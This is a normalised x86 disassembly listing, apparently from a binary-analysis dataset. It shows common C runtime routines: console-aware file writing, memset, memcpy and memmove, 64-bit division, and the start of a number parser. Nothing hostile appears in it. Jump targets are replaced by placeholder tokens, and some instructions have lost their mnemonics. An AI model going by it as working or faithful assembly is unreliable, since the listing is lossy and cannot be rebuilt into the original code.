cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_413695
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_413695
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_413695
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_41045b
push 0x10
push r--data
call sub_40f510
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
cmp ebx [ rwxdata ]
jb r-xdata
call sub_40f555
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x16
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40fea4
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_40e72d
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410549
mov eax [ ebp - 0x1c ]
sub_410551
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
pop ebp
retn
sub_410577
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_4105f0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_411080
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_40e72d
mov eax esi
jmp r-xdata
sub_4105f0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_417e9c
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_41066a
push 0xc
push r--data
call sub_40f510
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
setne al
cmp eax esi
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0xc ] edi
push edi
call sub_40c061
pop ecx
mov [ ebp - 0x4 ] esi
test [ edi + 0xc ] 0x40
jne r-xdata
call sub_40f555
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push edi
call sub_410551
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41076b
mov eax [ ebp - 0x1c ]
push edi
call sub_40f43d
mov esi eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
call [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
push edi
push esi
call sub_40f4d9
add esp 0x1c
mov ecx rwxdata
cmp eax 0xfffffffe
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rwxdata ]
jmp r-xdata
mov eax rwxdata
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_410840
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4108a8
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_418110
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rwxdata ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_40d20d
mov [ eax ] edi
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
jmp r-xdata
push esi
call sub_41384d
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_413695
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_41258b
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_40d1fa
mov [ eax ] 0x1c
call sub_40d20d
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_40d220
pop ecx
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_41452b
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_417f56
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_4180f4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_4180f4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_417f56
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_410fa5
push 0x10
push r--data
call sub_40f510
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_40f555
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4108a8
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411071
mov eax [ ebp - 0x1c ]
sub_411080
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_411104 ]
jmp [ ecx * 4 + jump_table_411184 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4111f0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_41138c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_411290 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41138c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4111f0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41138c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4111f0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4111f0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4111f0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41138c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41138c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41138c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4113e1
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_40d831
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_41813b
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
